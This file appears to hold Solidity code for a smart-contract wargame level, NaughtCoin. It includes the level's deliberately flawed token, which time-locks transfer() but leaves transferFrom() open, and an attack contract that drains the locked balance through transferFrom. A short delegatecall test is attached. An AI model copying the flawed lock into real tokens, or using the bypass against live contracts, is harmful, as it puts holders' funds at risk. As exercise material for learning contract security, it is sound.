// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(
        address _to,
        uint256 _value
    ) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}

contract NaughtCoinAttack {
    NaughtCoin public naughtCoin;
    address public owner;

    constructor(NaughtCoin _naughtCoin) {
        naughtCoin = _naughtCoin;
        owner = msg.sender;
        // After deploying set allownance for this contract to the max
    }

    function transfer(address _to, uint256 _value) public {
        // Call transfer from
        naughtCoin.transferFrom(owner, _to, _value);
    }
}

// Testing delegate call
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Import console log
import "hardhat/console.sol";

contract A {
    address public test;

    function b() public {
        test = msg.sender;
    }
}

contract B {
    A public a;

    constructor(A a_) {
        a = a_;
        // Send a delegate call to A
        (bool success, ) = address(a).delegatecall(
            abi.encodeWithSignature("b()")
        );
    }
}
